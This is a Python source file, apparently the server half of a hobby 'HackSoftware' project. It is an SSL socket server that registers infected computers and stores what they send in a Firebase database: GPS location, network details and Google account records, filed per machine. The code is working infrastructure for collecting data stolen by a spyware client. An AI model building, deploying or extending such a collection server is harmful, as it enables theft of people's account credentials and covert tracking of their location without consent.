import socket
import ssl
from threading import Thread
import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore

class Firebase_DB():
    def __init__(self):
        # Create a connect for firebase database
        self.cred = credentials.Certificate(R"C:\Users\raz\Desktop\פרויקטים מועדון המתכנתים\פריצת מחשב\HackSoftware\private_key.json")
        firebase_admin.initialize_app(self.cred)

        # get num of the computer and start the server
        self.server_ip = '' # The IP of the server
        self.port = 33453
        self.db = firestore.client()
        self.num_comp = len(list(self.db.collection("Computers").list_documents())) + 1
        self.start_server()

    def get_internal_ip(self):
        """
        The function trying to connect the internet and get the internal IP

        Parameters
        ----------
        self : self
            The attributes of the class

        Returns
        -------
        String / None
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return None

    def start_server(self):
        """
        The function open the server and listening for clients on secure tunnel
        Parameters
        ----------
        self : self
            The attributes of the class

        Returns
        -------
        String / None
        """
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((self.server_ip, self.port))
        server_socket.listen(30)

        print(f"Server is listening : {self.server_ip} : {self.port}")
        while True:
            client_socket, client_address = server_socket.accept()
            # Create ssl layer.
            ssl_connection = ssl.wrap_socket(client_socket, server_side=True, certfile="server.crt", keyfile="server.key")

            client_handler = Thread(target=self.handle_client, args=(ssl_connection,))
            client_handler.start()
    
    def handle_client(self, client_socket):
        """
        The function handle the clients that connect the server and start Thread respectively

        Parameters
        ----------
        self : self
            The attributes of the class
        socket : client_socket
            The client socket that connect to the server

        Returns
        -------
        None
        """
        msg = int.from_bytes(client_socket.recv(4), byteorder='big')
        if msg == 0:
            client_socket.send(self.num_comp.to_bytes(4, byteorder='big'))
            self.num_comp += 1
        if msg == 1:
            Thread(target=self.handle_network_and_GPS, args=(client_socket,)).start()
        elif msg == 2:
            Thread(target=self.handle_google_accounts, args=(client_socket,)).start()


    def handle_network_and_GPS(self, client_socket):
        """
        The function handle network and GPS data and add the data for the db

        Parameters
        ----------
        self : self
            The attributes of the class
        socket : client_socket
            The client socket that connect to the server

        Returns
        -------
        None
        """
        try:
            curr_num_comp = int.from_bytes(client_socket.recv(4), byteorder='big')

            size_GPS = int.from_bytes(client_socket.recv(4), byteorder='big')
            str_GPS = client_socket.recv(size_GPS).decode('utf-8')

            size_network = int.from_bytes(client_socket.recv(4), byteorder='big')
            str_network = client_socket.recv(size_network).decode('utf-8')
            
            self.db.collection('Computers').document(f'Comp{curr_num_comp}').collection('Info').document('GPS').set(self.string_to_dictionary(str_GPS))
            self.db.collection('Computers').document(f'Comp{curr_num_comp}').collection('Info').document('Network').set(self.string_to_dictionary(str_network))
        except Exception as e:
            print(e)

    def handle_google_accounts(self, client_socket):
        """
        The function handle google accounts data and add the data for the db

        Parameters
        ----------
        self : self
            The attributes of the class
        socket : client_socket
            The client socket that connect to the server

        Returns
        -------
        None
        """
        try:
            curr_num_comp = int.from_bytes(client_socket.recv(4), byteorder='big')

            count = 1
            while True:
                size_account = int.from_bytes(client_socket.recv(4), byteorder='big')
                if size_account == 0:
                    break
                else:
                    str_account = client_socket.recv(size_account).decode('utf-8')
                    self.db.collection('Computers').document(f'Comp{curr_num_comp}').collection('Google Accounts').document(f'Account {count}').set(self.string_to_dictionary(str_account))
                    count += 1      
        except Exception as e:
            print(e)

    def string_to_dictionary(self, string):
        """
        The function get a string with data and return a dictionary in specific format for this data

        Parameters
        ----------
        self : self
            The attributes of the class
        String : string
            The data stored in string

        Returns
        -------
        Dictionary
        """
        dic = {}
        string = str(string)
        Elements = string.split(',')
        for ele in Elements:
            key, val = ele.split(':', 1)
            dic[key] = val
        return dic

if __name__ == '__main__':
    system = Firebase_DB()